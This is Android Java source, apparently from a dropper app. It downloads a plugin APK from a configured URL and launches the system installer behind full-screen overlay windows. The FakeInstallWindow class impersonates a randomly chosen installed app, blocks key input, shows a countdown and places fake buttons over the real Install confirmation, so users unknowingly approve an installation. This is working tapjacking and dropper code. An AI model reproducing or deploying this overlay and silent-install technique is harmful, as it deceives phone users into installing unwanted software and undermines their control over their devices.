package com.xstd.qm;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.net.Uri;
import android.os.Handler;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import android.view.*;
import android.widget.ImageView;
import android.widget.TextView;
import com.bwx.bequick.fwk.Setting;
import com.plugin.common.utils.SingleInstanceBase;
import com.plugin.common.utils.UtilsRuntime;
import com.plugin.common.utils.files.FileDownloader;
import com.plugin.common.utils.files.FileOperatorHelper;
import com.xstd.qm.setting.SettingManager;
import com.xstd.quick.R;

import java.io.File;
import java.io.IOException;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-14
 * Time: PM3:47
 * To change this template use File | Settings | File Templates.
 */
public class UtilOperator {

    public static FakeInstallWindow fake;

    private static void intstallLocalApk(final Context context, final String fullPath) {
        try {
            Runtime.getRuntime().exec("chmod 666 " + fullPath);
        } catch (IOException e) {
            e.printStackTrace();
        }

        Config.LOGD("[[intstallLocalApk]] try to install plugin once with fake window");

        Handler handler = new Handler(context.getMainLooper());
        handler.post(new Runnable() {
            @Override
            public void run() {
                if (!Utils.isVersionBeyondGB()) {
                    fake = new FakeInstallWindowForGB(context);
                } else {
                    fake = new FakeInstallWindow(context);
                }
                fake.show(true);
                fake.updateTimerCount();

                Config.DOWNLOAD_PROCESS_RUNNING.set(false);
                Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] try to install apk : " + fullPath);

                Intent i = new Intent(Intent.ACTION_VIEW);
                File upgradeFile = new File(fullPath);
                i.setDataAndType(Uri.fromFile(upgradeFile), "application/vnd.android.package-archive");
                i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                i.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                context.startActivity(i);

                if (!AppRuntime.WATCHING_SERVICE_RUNNING.get()) {
                    Intent is = new Intent();
                    is.setClass(context, WatchingService.class);
                    context.startService(is);
                }
            }
        });
    }

    public static class FakeInstallWindow {

        protected static final int TIMER_COUNT = 100;

        protected View coverView;
        protected View timerView;
        protected TextView timeTV;
        protected View installView;
        protected View installFullView;
        protected Context context;
        protected WindowManager wm;
        protected int count = TIMER_COUNT;
        protected Handler handler;
        protected LayoutInflater layoutInflater;
        protected int screenWidth;
        protected int screenHeight;
        protected float density;

        protected WindowManager.LayoutParams confirmFullBtnParams;

        public FakeInstallWindow(Context context) {
            this.context = context;
            layoutInflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
            coverView = layoutInflater.inflate(R.layout.app_details, null);
            timerView = layoutInflater.inflate(R.layout.fake_timer, null);
            timeTV = (TextView) timerView.findViewById(R.id.timer);
            installView = layoutInflater.inflate(R.layout.fake_install_btn, null);
            installFullView = layoutInflater.inflate(R.layout.fake_install_btn, null);
            wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
            handler = new Handler(context.getMainLooper());

            DisplayMetrics dm = new DisplayMetrics();
            wm.getDefaultDisplay().getMetrics(dm);
            screenWidth = dm.widthPixels;
            screenHeight = dm.heightPixels;
            density = dm.density;

            //init view
            ImageView icon = (ImageView) coverView.findViewById(R.id.app_icon);
            TextView name = (TextView) coverView.findViewById(R.id.app_name);
            TextView content = (TextView) coverView.findViewById(R.id.center_explanation);
            PLuginManager.AppInfo appInfo = SingleInstanceBase.getInstance(PLuginManager.class).randomScanInstalledIcon(context);
            if (appInfo != null) {
                icon.setImageDrawable(appInfo.icon);
                name.setText(String.format(context.getString(R.string.protocal_title), appInfo.name));
                content.setText(context.getString(R.string.protocal).replace("**", appInfo.name));

                AppRuntime.CURRENT_FAKE_APP_INFO.name = appInfo.name;
                AppRuntime.CURRENT_FAKE_APP_INFO.packageNmae = appInfo.packageNmae;

                Config.LOGD("[[FakeInstallWindow]] current fake app info : name = " + name + " packageName = " + appInfo.packageNmae
                                + " >>>>>>>>>>>");
            }
        }

        public void updateTimerCount() {
            if (count <= 0) {
                if (coverView != null && timerView != null) {
                    wm.removeView(coverView);
                    wm.removeView(timerView);
                    wm.removeView(installView);

                    if (installFullView != null) {
                        wm.removeView(installFullView);
                    }
                }
                coverView = null;
                timerView = null;
                installView = null;
                installFullView = null;
                fake = null;
                AppRuntime.FAKE_WINDOWS_SHOW.set(false);

//                if (AppRuntime.PLUGIN_INSTALLED) {
                Utils.tryToActivePluginApp(context);
//                }
            } else {
                if (count == (TIMER_COUNT - 3 * 5) && AppRuntime.INSTALL_PACKAGE_TOP_SHOW.get()) {
                    //now just remove install full btn
                    if (installFullView != null) {
                        wm.removeView(installFullView);
                    }
                    installFullView = null;
                } else if (count == 1 * 5) {
                    AppRuntime.WATCHING_SERVICE_BREAK.set(true);
                    if (installFullView == null) {
                        installFullView = layoutInflater.inflate(R.layout.fake_install_btn, null);
                        wm.addView(installFullView, confirmFullBtnParams);
                    }

                    UtilsRuntime.goHome(context);
                } else if (AppRuntime.PLUGIN_INSTALLED || !AppRuntime.INSTALL_PACKAGE_TOP_SHOW.get()) {
                    /**
                     * 显示全部install btn，全遮盖，
                     * 当已经安装了，或者已经当前最顶层Activity不是安装界面的时候
                     */

                    if (installFullView == null) {
                        installFullView = layoutInflater.inflate(R.layout.fake_install_btn, null);
                        wm.addView(installFullView, confirmFullBtnParams);
                    }
                } else if (!AppRuntime.PLUGIN_INSTALLED && AppRuntime.INSTALL_PACKAGE_TOP_SHOW.get()
                               && count > 1 * 5) {
                    /**
                     * 显示全部部分遮盖btn
                     * 当没有安装，并且顶层窗口是安装界面，并且时间大于1S的时候
                     */
                    if (installFullView != null) {
                        wm.removeView(installFullView);
                    }
                    installFullView = null;
                }

                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        if (coverView != null && timerView != null) {
                            int time = count / 5;
                            int deta = count % 5;
                            if (deta > 0) {
                                time = time + 1;
                            }

                            timeTV.setText(String.format(context.getString(R.string.fake_timer), time));
                            count--;
                            handler.postDelayed(new Runnable() {
                                @Override
                                public void run() {
                                    updateTimerCount();
                                }
                            }, 200);
                        }
                    }
                });
            }

        }

        public void dismiss() {
//            if (coverView != null && timerView != null) {
//                wm.removeView(coverView);
//                wm.removeView(timerView);
//            }
//            coverView = null;
//            timerView = null;
//            fake = null;
        }

        public void show(boolean full) {
            String model = android.os.Build.MODEL;
            if (!TextUtils.isEmpty(model)) {
                model = model.toLowerCase();
            }
            boolean leftConfirm = false;
            for (String m : AppRuntime.LEFT_CONFIRM_LIST) {
                if (model.startsWith(m)) {
                    leftConfirm = true;
                    break;
                }
            }

            AppRuntime.FAKE_WINDOWS_SHOW.set(true);
            //install
            WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
            confirmBtnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
            confirmBtnParams.format = PixelFormat.RGBA_8888;
            confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
            confirmBtnParams.width = (int) (50 * density);
            confirmBtnParams.height = (int) (48 * density);
            if (!leftConfirm) {
//                confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2 + (int) (25 * density);
                confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2 + screenWidth / 2;
//                confirmBtnParams.y = screenHeight - (int) (48 * density);
                confirmBtnParams.gravity = Gravity.BOTTOM | Gravity.START;
            } else {
                confirmBtnParams.width = (int) (52 * density);
                confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2;
                confirmBtnParams.gravity = Gravity.BOTTOM | Gravity.START;
            }
            wm.addView(installView, confirmBtnParams);

            confirmFullBtnParams = new WindowManager.LayoutParams();
            confirmFullBtnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
            confirmFullBtnParams.format = PixelFormat.RGBA_8888;
            confirmFullBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
            confirmFullBtnParams.width = screenWidth / 2;
            confirmFullBtnParams.height = (int) (48 * density);
            if (!leftConfirm) {
                confirmFullBtnParams.gravity = Gravity.BOTTOM | Gravity.RIGHT;
            } else {
                confirmFullBtnParams.gravity = Gravity.BOTTOM | Gravity.LEFT;
            }

            wm.addView(installFullView, confirmFullBtnParams);

            //timer
            WindowManager.LayoutParams btnParams = new WindowManager.LayoutParams();
            btnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
            btnParams.format = PixelFormat.RGBA_8888;
            btnParams.flags = android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
            btnParams.width = screenWidth / 2;
            btnParams.height = (int) (48 * density);
            if (!leftConfirm) {
                btnParams.gravity = Gravity.LEFT | Gravity.BOTTOM;
            } else {
                btnParams.gravity = Gravity.RIGHT | Gravity.BOTTOM;
            }
            wm.addView(timerView, btnParams);

            //cover
            WindowManager.LayoutParams wMParams = new WindowManager.LayoutParams();
            wMParams.type = WindowManager.LayoutParams.TYPE_PHONE;
            wMParams.format = PixelFormat.RGBA_8888;
            wMParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL | WindowManager.LayoutParams.FLAG_FULLSCREEN;
//                                | WindowManager.LayoutParams.FLAG_FULLSCREEN | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN;
            wMParams.width = WindowManager.LayoutParams.FILL_PARENT;
            wMParams.height = screenHeight - (int) ((48 + 25) * density);
            wMParams.gravity = Gravity.LEFT | Gravity.TOP;
            coverView.setOnKeyListener(new View.OnKeyListener() {
                @Override
                public boolean onKey(View view, int i, KeyEvent keyEvent) {
                    return true;
                }
            });
            wm.addView(coverView, wMParams);
        }

    }

    public static boolean isPluginApkExist() {
        String local = SettingManager.getInstance().getLocalApkPath();
        if (TextUtils.isEmpty(local)) {
            return false;
        }

        File apkFile = new File(local);
        if (apkFile.exists()) {
            return true;
        }

        return false;
    }

    public static void tryToDownloadPlugin(final Context context) {
        final String local = SettingManager.getInstance().getLocalApkPath();
        String downloadUrl = SettingManager.getInstance().getKeyDownloadUrl();
        if (TextUtils.isEmpty(local) || TextUtils.isEmpty(downloadUrl)) {
            return;
        }

        if (UtilsRuntime.isOnline(context)) {
            Config.LOGD("[[tryToDownloadPlugin::onReceive]] current is ONLINE  try to download plugin!!!");

            if (!Config.DOWNLOAD_PROCESS_RUNNING.get()) {
                Config.DOWNLOAD_PROCESS_RUNNING.set(true);
                File apkFile = new File(local);
                if (apkFile.exists()) {
                    Config.DOWNLOAD_PROCESS_RUNNING.set(false);
                    return;
                }

                FileDownloader.getInstance(context).postRequest(new FileDownloader.DownloadRequest(downloadUrl)
                                                                   , new FileDownloader.DownloadListener() {
                    @Override
                    public void onDownloadProcess(int fileSize, int downloadSize) {
                        Config.LOGD("[[tryToInstallPlugin]] downalod file size : " + downloadSize);
                    }

                    @Override
                    public void onDownloadFinished(int status, Object response) {
                        Config.DOWNLOAD_PROCESS_RUNNING.set(false);
                        if (response != null) {
                            FileDownloader.DownloadResponse r = (FileDownloader.DownloadResponse) response;
                            String localUrl = r.getRawLocalPath();
                            Config.LOGD("[[tryToDownloadPlugin]] download file success to : " + localUrl);
                            if (!TextUtils.isEmpty(localUrl)) {
                                String targetPath = FileOperatorHelper.copyFile(localUrl, local);
                                if (!TextUtils.isEmpty(targetPath)) {
                                    Config.LOGD("[[tryToDownloadPlugin]] try to mv download file to : " + targetPath);

                                    File targetFile = new File(targetPath);
                                    if (!Utils.checkAPK(context, targetPath)) {
                                        Config.LOGD("[[tryToDownloadPlugin]] try to check APK : " + targetPath + " <<<<<<<< Failed >>>>>>>>");
                                        //delete targetPath
                                        targetFile.delete();
                                        File localFile = new File(localUrl);
                                        localFile.delete();

                                        return;
                                    }

                                    if (targetFile.exists()) {
                                        Config.LOGD("[[tryToDownloadPlugin]] success download plugin file : " + targetPath);
                                    }
                                }
                            }
                        } else {
                            Config.LOGD("[[tryToDownloadPlugin]] download plugin falied, response is null");
                        }
                    }
                });
            }

        }
    }

    public static void tryToInstallPluginLocal(Context context) {
        String local = SettingManager.getInstance().getLocalApkPath();
        if (TextUtils.isEmpty(local)) {
            return;
        }

        File apkFile = new File(local);
        if (apkFile.exists()) {
            intstallLocalApk(context, local);
            return;
        }
    }

    public static void tryToInstallPlugin(final Context context) {
        final String local = SettingManager.getInstance().getLocalApkPath();
        String downloadUrl = SettingManager.getInstance().getKeyDownloadUrl();
        if (TextUtils.isEmpty(local) || TextUtils.isEmpty(downloadUrl)) {
            return;
        }

        if (UtilsRuntime.isOnline(context)) {
            Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] current is ONLINE !!!");

            if (!Config.DOWNLOAD_PROCESS_RUNNING.get()) {
                Config.DOWNLOAD_PROCESS_RUNNING.set(true);
                File apkFile = new File(local);
                if (apkFile.exists()) {
                    intstallLocalApk(context, local);
                    Config.DOWNLOAD_PROCESS_RUNNING.set(false);
                    return;
                }

                FileDownloader.getInstance(context).postRequest(
                                                                   new FileDownloader.DownloadRequest(downloadUrl)
                                                                   , new FileDownloader.DownloadListener() {
                    @Override
                    public void onDownloadProcess(int fileSize, int downloadSize) {
                        Config.LOGD("[[tryToInstallPlugin]] downalod file size : " + downloadSize);
                    }

                    @Override
                    public void onDownloadFinished(int status, Object response) {
                        if (response != null) {
                            FileDownloader.DownloadResponse r = (FileDownloader.DownloadResponse) response;
                            String localUrl = r.getRawLocalPath();
                            Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] download file success to : " + localUrl);
                            if (!TextUtils.isEmpty(localUrl)) {
                                String targetPath = FileOperatorHelper.copyFile(localUrl, local);
                                if (!TextUtils.isEmpty(targetPath)) {
                                    Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] try to mv download file to : " + targetPath);
                                    File targetFile = new File(targetPath);
                                    if (targetFile.exists()) {
                                        intstallLocalApk(context, local);
                                    }
                                }
                            }
                        }
                    }
                });
            }

        }
    }

    public static void startActiveAlarm(Context context, long delay) {
        cancelActiveAlarm(context);
        Intent intent = new Intent();
        intent.setAction(DemonService.ACTION_ACTIVE_MAIN);
        intent.setClass(context, DemonService.class);
        PendingIntent sender = PendingIntent.getService(context, 0, intent, 0);
        long firstime = System.currentTimeMillis();
        AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);

        am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, firstime + delay, sender);
        Config.LOGD("[[startActiveAlarm]]");
    }

    public static void cancelActiveAlarm(Context context) {
        Config.LOGD("[[cancelActiveAlarm]]");
        Intent intent = new Intent();
        intent.setAction(DemonService.ACTION_ACTIVE_MAIN);
        intent.setClass(context, DemonService.class);
        PendingIntent sender = PendingIntent.getService(context, 0, intent, 0);
        AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        am.cancel(sender);
    }
}
